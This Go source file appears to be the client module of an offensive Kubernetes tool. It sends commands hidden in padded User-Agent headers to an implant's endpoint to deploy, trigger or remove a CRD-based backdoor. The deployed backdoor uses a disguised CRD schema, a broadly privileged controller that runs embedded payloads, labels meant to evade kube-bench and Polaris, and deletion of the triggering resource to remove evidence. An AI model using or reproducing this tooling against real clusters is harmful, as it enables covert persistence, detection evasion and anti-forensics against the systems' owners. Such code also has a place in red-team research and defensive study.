package crd_backdoor

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type BackdoorResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, action, crdName, output string) error {
	result := &BackdoorResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "trigger":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"create_cr", "create custom resource instance to trigger reconciliation", "crd_create_cr"},
			{"execute_payload", "controller executes embedded payload on reconcile event", "crd_execute"},
			{"cleanup_cr", "delete triggering CR to remove evidence", "crd_cleanup"},
		}
	case "remove":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"delete_controller", "remove backdoor controller deployment", "crd_delete_ctrl"},
			{"delete_crd", "remove custom resource definition from cluster", "crd_delete_crd"},
			{"delete_rbac", "remove associated ClusterRole and ClusterRoleBinding", "crd_delete_rbac"},
		}
	default: // deploy
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"create_crd", "register CRD with legitimate-looking schema (monitoring.internal/v1)", "crd_create"},
			{"deploy_controller", "deploy controller pod that executes commands on CR creation", "crd_deploy_ctrl"},
			{"create_rbac", "create ClusterRole with broad permissions for controller SA", "crd_create_rbac"},
			{"hide_controller", "label controller pod to avoid detection by kube-bench/polaris", "crd_hide"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + action + "#" + crdName
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/crd_backdoor", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
